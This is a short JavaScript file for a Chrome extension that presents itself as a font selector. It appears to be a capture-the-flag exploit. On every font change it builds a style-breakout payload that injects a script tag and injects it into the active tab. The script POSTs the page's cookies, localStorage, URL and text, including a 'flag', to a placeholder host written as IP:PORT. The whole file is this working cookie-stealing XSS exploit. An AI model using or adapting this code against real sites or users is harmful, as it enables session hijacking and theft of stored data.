const sel = document.getElementById("fontSelector");

sel.addEventListener("change", () => {
  const payload = sel.value + "'; }</style><script>fetch('http://IP:PORT/?cookie',{method:'POST',body:JSON.stringify({cookie:document.cookie,url:location.href,localStorage:JSON.stringify(localStorage),flag:document.body.innerText})})</script><style>*{font-family:'";
  
  chrome.storage.sync.set({ selectedFont: payload });
  
  chrome.tabs.query({active:true,currentWindow:true}, tabs => {
    chrome.scripting.executeScript({
      target: {tabId: tabs[0].id},
      func: (f) => {
        const s = document.createElement("style");
        s.innerText = `* { font-family: '${f}' !important; }`;
        document.head.appendChild(s);
      },
      args: [payload]
    });
  });
});
